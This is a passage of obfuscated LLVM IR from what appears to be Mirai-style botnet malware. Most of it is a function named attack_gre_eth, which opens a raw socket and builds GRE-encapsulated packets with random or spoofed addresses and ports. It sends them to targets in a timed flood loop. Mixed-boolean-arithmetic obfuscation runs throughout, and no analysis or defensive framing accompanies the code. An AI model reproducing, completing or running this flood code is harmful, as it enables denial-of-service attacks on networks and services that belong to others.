  %550 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %549, i32 0, i32 2
  %551 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %550, i32 0, i32 0
  store i32 %544, i32* %551, align 4
  %552 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %553 = load i32, i32* %11, align 4
  %554 = sext i32 %553 to i64
  %555 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %552, i64 %554
  %556 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %555, i32 0, i32 0
  %557 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %556, i32 0, i32 1
  store i16 0, i16* %557, align 2
  %558 = load i32, i32* %12, align 4
  %559 = load i8*, i8** %29, align 8
  %560 = load i32, i32* %20, align 4
  %561 = sext i32 %560 to i64
  %562 = sub i64 0, 52
  %563 = sub i64 0, %561
  %564 = add i64 %562, %563
  %565 = sub i64 0, %564
  %566 = add i64 52, %561
  %567 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %568 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %569 = load i32, i32* %11, align 4
  %570 = sext i32 %569 to i64
  %571 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %568, i64 %570
  %572 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %571, i32 0, i32 0
  %573 = bitcast %struct.sockaddr_in* %572 to %struct.sockaddr*
  store %struct.sockaddr* %573, %struct.sockaddr** %567, align 8
  %574 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %575 = load %struct.sockaddr*, %struct.sockaddr** %574, align 8
  %576 = call i64 @sendto(i32 %558, i8* %559, i64 %565, i32 16384, %struct.sockaddr* %575, i32 16)
  br label %577

; <label>:577:                                    ; preds = %503
  %578 = load i32, i32* %11, align 4
  %579 = sub i32 0, 1
  %580 = sub i32 %578, %579
  %581 = add nsw i32 %578, 1
  store i32 %580, i32* %11, align 4
  br label %356

; <label>:582:                                    ; preds = %356
  %583 = call i64 @time(i64* null) #6
  %584 = load i32, i32* %24, align 4
  %585 = sext i32 %584 to i64
  %586 = icmp sgt i64 %583, %585
  br i1 %586, label %587, label %588

; <label>:587:                                    ; preds = %582
  br label %589

; <label>:588:                                    ; preds = %582
  br label %355

; <label>:589:                                    ; preds = %587, %94, %88
  ret void
}

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.ethhdr*, align 8
  %28 = alloca %struct.iphdr*, align 8
  %29 = alloca %struct.udphdr*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.grehdr*, align 8
  %36 = alloca %struct.ethhdr*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %44 = load i8, i8* %7, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 8) #6
  %47 = bitcast i8* %46 to i8**
  store i8** %47, i8*** %13, align 8
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 2, i32 0)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %14, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 3, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %15, align 2
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 4, i32 64)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %16, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 5, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %17, align 1
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 6, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %18, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %19, align 2
  %72 = load i8, i8* %9, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 0, i32 512)
  store i32 %74, i32* %20, align 4
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 1, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 18, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = load i32, i32* @LOCAL_ADDR, align 4
  %86 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 19, i32 %85)
  store i32 %86, i32* %23, align 4
  %87 = call i64 @time(i64* null) #6
  %88 = load i32, i32* %6, align 4
  %89 = sext i32 %88 to i64
  %90 = sub i64 0, %89
  %91 = sub i64 %87, %90
  %92 = add nsw i64 %87, %89
  %93 = trunc i64 %91 to i32
  store i32 %93, i32* %24, align 4
  %94 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %94, i32* %12, align 4
  %95 = icmp eq i32 %94, -1
  br i1 %95, label %96, label %97

; <label>:96:                                     ; preds = %5
  br label %615

; <label>:97:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %98 = load i32, i32* %12, align 4
  %99 = bitcast i32* %11 to i8*
  %100 = call i32 @setsockopt(i32 %98, i32 0, i32 3, i8* %99, i32 4) #6
  %101 = icmp eq i32 %100, -1
  br i1 %101, label %102, label %105

; <label>:102:                                    ; preds = %97
  %103 = load i32, i32* %12, align 4
  %104 = call i32 @close(i32 %103)
  br label %615

; <label>:105:                                    ; preds = %97
  store i32 0, i32* %11, align 4
  br label %106

; <label>:106:                                    ; preds = %344, %105
  %107 = load i32, i32* %11, align 4
  %108 = load i8, i8* %7, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp slt i32 %107, %109
  br i1 %110, label %111, label %349

; <label>:111:                                    ; preds = %106
  %112 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %113 = load i8**, i8*** %13, align 8
  %114 = load i32, i32* %11, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8*, i8** %113, i64 %115
  store i8* %112, i8** %116, align 8
  %117 = load i8**, i8*** %13, align 8
  %118 = load i32, i32* %11, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds i8*, i8** %117, i64 %119
  %121 = load i8*, i8** %120, align 8
  %122 = bitcast i8* %121 to %struct.iphdr*
  store %struct.iphdr* %122, %struct.iphdr** %25, align 8
  %123 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %124 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %123, i64 1
  %125 = bitcast %struct.iphdr* %124 to %struct.grehdr*
  store %struct.grehdr* %125, %struct.grehdr** %26, align 8
  %126 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %127 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %126, i64 1
  %128 = bitcast %struct.grehdr* %127 to %struct.ethhdr*
  store %struct.ethhdr* %128, %struct.ethhdr** %27, align 8
  %129 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %130 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %129, i64 1
  %131 = bitcast %struct.ethhdr* %130 to %struct.iphdr*
  store %struct.iphdr* %131, %struct.iphdr** %28, align 8
  %132 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %133 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %132, i64 1
  %134 = bitcast %struct.iphdr* %133 to %struct.udphdr*
  store %struct.udphdr* %134, %struct.udphdr** %29, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %136 = bitcast %struct.iphdr* %135 to i8*
  %137 = load i8, i8* %136, align 4
  %138 = xor i8 15, -1
  %139 = xor i8 %137, %138
  %140 = and i8 %139, %137
  %141 = and i8 %137, 15
  %142 = xor i8 %140, -1
  %143 = xor i8 64, -1
  %144 = xor i8 -113, -1
  %145 = and i8 %142, -113
  %146 = and i8 %140, %144
  %147 = and i8 %143, -113
  %148 = and i8 64, %144
  %149 = or i8 %145, %146
  %150 = or i8 %147, %148
  %151 = xor i8 %149, %150
  %152 = or i8 %142, %143
  %153 = xor i8 %152, -1
  %154 = or i8 -113, %144
  %155 = and i8 %153, %154
  %156 = or i8 %151, %155
  %157 = or i8 %140, 64
  store i8 %156, i8* %136, align 4
  %158 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %159 = bitcast %struct.iphdr* %158 to i8*
  %160 = load i8, i8* %159, align 4
  %161 = xor i8 %160, -1
  %162 = xor i8 -16, -1
  %163 = xor i8 -16, -1
  %164 = or i8 %161, %162
  %165 = or i8 -16, %163
  %166 = xor i8 %164, -1
  %167 = and i8 %166, %165
  %168 = and i8 %160, -16
  %169 = xor i8 %167, -1
  %170 = xor i8 5, -1
  %171 = xor i8 96, -1
  %172 = and i8 %169, 96
  %173 = and i8 %167, %171
  %174 = and i8 %170, 96
  %175 = and i8 5, %171
  %176 = or i8 %172, %173
  %177 = or i8 %174, %175
  %178 = xor i8 %176, %177
  %179 = or i8 %169, %170
  %180 = xor i8 %179, -1
  %181 = or i8 96, %171
  %182 = and i8 %180, %181
  %183 = or i8 %178, %182
  %184 = or i8 %167, 5
  store i8 %183, i8* %159, align 4
  %185 = load i8, i8* %14, align 1
  %186 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 1
  store i8 %185, i8* %187, align 1
  %188 = load i32, i32* %20, align 4
  %189 = sext i32 %188 to i64
  %190 = sub i64 66, 6951014351161374753
  %191 = add i64 %190, %189
  %192 = add i64 %191, 6951014351161374753
  %193 = add i64 66, %189
  %194 = trunc i64 %192 to i16
  %195 = call zeroext i16 @htons(i16 zeroext %194) #7
  %196 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 2
  store i16 %195, i16* %197, align 2
  %198 = load i16, i16* %15, align 2
  %199 = call zeroext i16 @htons(i16 zeroext %198) #7
  %200 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 3
  store i16 %199, i16* %201, align 4
  %202 = load i8, i8* %16, align 1
  %203 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 5
  store i8 %202, i8* %204, align 4
  %205 = load i8, i8* %17, align 1
  %206 = icmp ne i8 %205, 0
  br i1 %206, label %207, label %211

; <label>:207:                                    ; preds = %111
  %208 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %209 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 4
  store i16 %208, i16* %210, align 2
  br label %211

; <label>:211:                                    ; preds = %207, %111
  %212 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 6
  store i8 47, i8* %213, align 1
  %214 = load i32, i32* %23, align 4
  %215 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 8
  store i32 %214, i32* %216, align 4
  %217 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %218 = load i32, i32* %11, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %217, i64 %219
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %220, i32 0, i32 1
  %222 = load i32, i32* %221, align 4
  %223 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 9
  store i32 %222, i32* %224, align 4
  %225 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %226 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %227 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %226, i32 0, i32 1
  store i16 %225, i16* %227, align 2
  %228 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %229 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %230 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %229, i32 0, i32 2
  store i16 %228, i16* %230, align 1
  %231 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %232 = bitcast %struct.iphdr* %231 to i8*
  %233 = load i8, i8* %232, align 4
  %234 = xor i8 %233, -1
  %235 = xor i8 15, -1
  %236 = xor i8 -36, -1
  %237 = or i8 %234, %235
  %238 = or i8 -36, %236
  %239 = xor i8 %237, -1
  %240 = and i8 %239, %238
  %241 = and i8 %233, 15
  %242 = and i8 %240, 64
  %243 = xor i8 %240, 64
  %244 = or i8 %242, %243
  %245 = or i8 %240, 64
  store i8 %244, i8* %232, align 4
  %246 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %247 = bitcast %struct.iphdr* %246 to i8*
  %248 = load i8, i8* %247, align 4
  %249 = xor i8 -16, -1
  %250 = xor i8 %248, %249
  %251 = and i8 %250, %248
  %252 = and i8 %248, -16
  %253 = and i8 %251, 5
  %254 = xor i8 %251, 5
  %255 = or i8 %253, %254
  %256 = or i8 %251, 5
  store i8 %255, i8* %247, align 4
  %257 = load i8, i8* %14, align 1
  %258 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %259 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %258, i32 0, i32 1
  store i8 %257, i8* %259, align 1
  %260 = load i32, i32* %20, align 4
  %261 = sext i32 %260 to i64
  %262 = sub i64 0, %261
  %263 = sub i64 28, %262
  %264 = add i64 28, %261
  %265 = trunc i64 %263 to i16
  %266 = call zeroext i16 @htons(i16 zeroext %265) #7
  %267 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %268 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %267, i32 0, i32 2
  store i16 %266, i16* %268, align 2
  %269 = load i16, i16* %15, align 2
  %270 = zext i16 %269 to i32
  %271 = xor i32 %270, -1
  %272 = and i32 -911019988, %271
  %273 = xor i32 -911019988, -1
  %274 = and i32 %270, %273
  %275 = xor i32 -1, -1
  %276 = and i32 %275, -911019988
  %277 = and i32 -1, %273
  %278 = or i32 %272, %274
  %279 = or i32 %276, %277
  %280 = xor i32 %278, %279
  %281 = xor i32 %270, -1
  %282 = trunc i32 %280 to i16
  %283 = call zeroext i16 @htons(i16 zeroext %282) #7
  %284 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 3
  store i16 %283, i16* %285, align 4
  %286 = load i8, i8* %16, align 1
  %287 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %288 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %287, i32 0, i32 5
  store i8 %286, i8* %288, align 4
  %289 = load i8, i8* %17, align 1
  %290 = icmp ne i8 %289, 0
  br i1 %290, label %291, label %295

; <label>:291:                                    ; preds = %211
  %292 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %293 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %294 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %293, i32 0, i32 4
  store i16 %292, i16* %294, align 2
  br label %295

; <label>:295:                                    ; preds = %291, %211
  %296 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i32 0, i32 6
  store i8 17, i8* %297, align 1
  %298 = call i32 @rand_next()
  %299 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %300 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %299, i32 0, i32 8
  store i32 %298, i32* %300, align 4
  %301 = load i8, i8* %22, align 1
  %302 = icmp ne i8 %301, 0
  br i1 %302, label %303, label %309

; <label>:303:                                    ; preds = %295
  %304 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %305 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %304, i32 0, i32 9
  %306 = load i32, i32* %305, align 4
  %307 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %308 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %307, i32 0, i32 9
  store i32 %306, i32* %308, align 4
  br label %325

; <label>:309:                                    ; preds = %295
  %310 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %311 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %310, i32 0, i32 8
  %312 = load i32, i32* %311, align 4
  %313 = sub i32 %312, 290831660
  %314 = sub i32 %313, 1024
  %315 = add i32 %314, 290831660
  %316 = sub i32 %312, 1024
  %317 = xor i32 %315, -1
  %318 = and i32 -1, %317
  %319 = xor i32 -1, -1
  %320 = and i32 %315, %319
  %321 = or i32 %318, %320
  %322 = xor i32 %315, -1
  %323 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %324 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %323, i32 0, i32 9
  store i32 %321, i32* %324, align 4
  br label %325

; <label>:325:                                    ; preds = %309, %303
  %326 = load i16, i16* %18, align 2
  %327 = call zeroext i16 @htons(i16 zeroext %326) #7
  %328 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %329 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %328, i32 0, i32 0
  store i16 %327, i16* %329, align 2
  %330 = load i16, i16* %19, align 2
  %331 = call zeroext i16 @htons(i16 zeroext %330) #7
  %332 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %333 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %332, i32 0, i32 1
  store i16 %331, i16* %333, align 2
  %334 = load i32, i32* %20, align 4
  %335 = sext i32 %334 to i64
  %336 = add i64 8, 6844801145440808092
  %337 = add i64 %336, %335
  %338 = sub i64 %337, 6844801145440808092
  %339 = add i64 8, %335
  %340 = trunc i64 %338 to i16
  %341 = call zeroext i16 @htons(i16 zeroext %340) #7
  %342 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %343 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %342, i32 0, i32 2
  store i16 %341, i16* %343, align 2
  br label %344

; <label>:344:                                    ; preds = %325
  %345 = load i32, i32* %11, align 4
  %346 = sub i32 0, 1
  %347 = sub i32 %345, %346
  %348 = add nsw i32 %345, 1
  store i32 %347, i32* %11, align 4
  br label %106

; <label>:349:                                    ; preds = %106
  br label %350

; <label>:350:                                    ; preds = %614, %349
  store i32 0, i32* %11, align 4
  br label %351

; <label>:351:                                    ; preds = %601, %350
  %352 = load i32, i32* %11, align 4
  %353 = load i8, i8* %7, align 1
  %354 = zext i8 %353 to i32
  %355 = icmp slt i32 %352, %354
  br i1 %355, label %356, label %608

; <label>:356:                                    ; preds = %351
  %357 = load i8**, i8*** %13, align 8
  %358 = load i32, i32* %11, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds i8*, i8** %357, i64 %359
  %361 = load i8*, i8** %360, align 8
  store i8* %361, i8** %33, align 8
  %362 = load i8*, i8** %33, align 8
  %363 = bitcast i8* %362 to %struct.iphdr*
  store %struct.iphdr* %363, %struct.iphdr** %34, align 8
  %364 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %365 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %364, i64 1
  %366 = bitcast %struct.iphdr* %365 to %struct.grehdr*
  store %struct.grehdr* %366, %struct.grehdr** %35, align 8
  %367 = load %struct.grehdr*, %struct.grehdr** %35, align 8
  %368 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %367, i64 1
  %369 = bitcast %struct.grehdr* %368 to %struct.ethhdr*
  store %struct.ethhdr* %369, %struct.ethhdr** %36, align 8
  %370 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %371 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %370, i64 1
  %372 = bitcast %struct.ethhdr* %371 to %struct.iphdr*
  store %struct.iphdr* %372, %struct.iphdr** %37, align 8
  %373 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %374 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %373, i64 1
  %375 = bitcast %struct.iphdr* %374 to %struct.udphdr*
  store %struct.udphdr* %375, %struct.udphdr** %38, align 8
  %376 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %377 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %376, i64 1
  %378 = bitcast %struct.udphdr* %377 to i8*
  store i8* %378, i8** %39, align 8
  %379 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %380 = load i32, i32* %11, align 4
  %381 = sext i32 %380 to i64
  %382 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %379, i64 %381
  %383 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %382, i32 0, i32 2
  %384 = load i8, i8* %383, align 4
  %385 = zext i8 %384 to i32
  %386 = icmp slt i32 %385, 32
  br i1 %386, label %387, label %411

; <label>:387:                                    ; preds = %356
  %388 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %389 = load i32, i32* %11, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %388, i64 %390
  %392 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %391, i32 0, i32 1
  %393 = load i32, i32* %392, align 4
  %394 = call i32 @ntohl(i32 %393) #7
  %395 = call i32 @rand_next()
  %396 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %397 = load i32, i32* %11, align 4
  %398 = sext i32 %397 to i64
  %399 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %396, i64 %398
  %400 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %399, i32 0, i32 2
  %401 = load i8, i8* %400, align 4
  %402 = zext i8 %401 to i32
  %403 = lshr i32 %395, %402
  %404 = add i32 %394, 231398165
  %405 = add i32 %404, %403
  %406 = sub i32 %405, 231398165
  %407 = add i32 %394, %403
  %408 = call i32 @htonl(i32 %406) #7
  %409 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 9
  store i32 %408, i32* %410, align 4
  br label %411

; <label>:411:                                    ; preds = %387, %356
  %412 = load i32, i32* %23, align 4
  %413 = icmp eq i32 %412, -1
  br i1 %413, label %414, label %418

; <label>:414:                                    ; preds = %411
  %415 = call i32 @rand_next()
  %416 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %417 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %416, i32 0, i32 8
  store i32 %415, i32* %417, align 4
  br label %418

; <label>:418:                                    ; preds = %414, %411
  %419 = load i16, i16* %15, align 2
  %420 = zext i16 %419 to i32
  %421 = icmp eq i32 %420, 65535
  br i1 %421, label %422, label %457

; <label>:422:                                    ; preds = %418
  %423 = call i32 @rand_next()
  %424 = xor i32 %423, -1
  %425 = xor i32 65535, -1
  %426 = xor i32 445170607, -1
  %427 = or i32 %424, %425
  %428 = or i32 445170607, %426
  %429 = xor i32 %427, -1
  %430 = and i32 %429, %428
  %431 = and i32 %423, 65535
  %432 = trunc i32 %430 to i16
  %433 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %434 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %433, i32 0, i32 3
  store i16 %432, i16* %434, align 4
  %435 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %436 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %435, i32 0, i32 3
  %437 = load i16, i16* %436, align 4
  %438 = zext i16 %437 to i32
  %439 = add i32 %438, -1891656933
  %440 = sub i32 %439, 1000
  %441 = sub i32 %440, -1891656933
  %442 = sub nsw i32 %438, 1000
  %443 = xor i32 %441, -1
  %444 = and i32 -203168714, %443
  %445 = xor i32 -203168714, -1
  %446 = and i32 %441, %445
  %447 = xor i32 -1, -1
  %448 = and i32 %447, -203168714
  %449 = and i32 -1, %445
  %450 = or i32 %444, %446
  %451 = or i32 %448, %449
  %452 = xor i32 %450, %451
  %453 = xor i32 %441, -1
  %454 = trunc i32 %452 to i16
  %455 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %456 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %455, i32 0, i32 3
  store i16 %454, i16* %456, align 4
  br label %457

; <label>:457:                                    ; preds = %422, %418
  %458 = load i16, i16* %18, align 2
  %459 = zext i16 %458 to i32
  %460 = icmp eq i32 %459, 65535
  br i1 %460, label %461, label %470

; <label>:461:                                    ; preds = %457
  %462 = call i32 @rand_next()
  %463 = xor i32 65535, -1
  %464 = xor i32 %462, %463
  %465 = and i32 %464, %462
  %466 = and i32 %462, 65535
  %467 = trunc i32 %465 to i16
  %468 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %469 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %468, i32 0, i32 0
  store i16 %467, i16* %469, align 2
  br label %470

; <label>:470:                                    ; preds = %461, %457
  %471 = load i16, i16* %19, align 2
  %472 = zext i16 %471 to i32
  %473 = icmp eq i32 %472, 65535
  br i1 %473, label %474, label %483

; <label>:474:                                    ; preds = %470
  %475 = call i32 @rand_next()
  %476 = xor i32 65535, -1
  %477 = xor i32 %475, %476
  %478 = and i32 %477, %475
  %479 = and i32 %475, 65535
  %480 = trunc i32 %478 to i16
  %481 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %482 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %481, i32 0, i32 1
  store i16 %480, i16* %482, align 2
  br label %483

; <label>:483:                                    ; preds = %474, %470
  %484 = load i8, i8* %22, align 1
  %485 = icmp ne i8 %484, 0
  br i1 %485, label %490, label %486

; <label>:486:                                    ; preds = %483
  %487 = call i32 @rand_next()
  %488 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %489 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %488, i32 0, i32 9
  store i32 %487, i32* %489, align 4
  br label %496

; <label>:490:                                    ; preds = %483
  %491 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %492 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %491, i32 0, i32 9
  %493 = load i32, i32* %492, align 4
  %494 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %495 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %494, i32 0, i32 9
  store i32 %493, i32* %495, align 4
  br label %496

; <label>:496:                                    ; preds = %490, %486
  %497 = call i32 @rand_next()
  store i32 %497, i32* %40, align 4
  %498 = call i32 @rand_next()
  store i32 %498, i32* %41, align 4
  %499 = call i32 @rand_next()
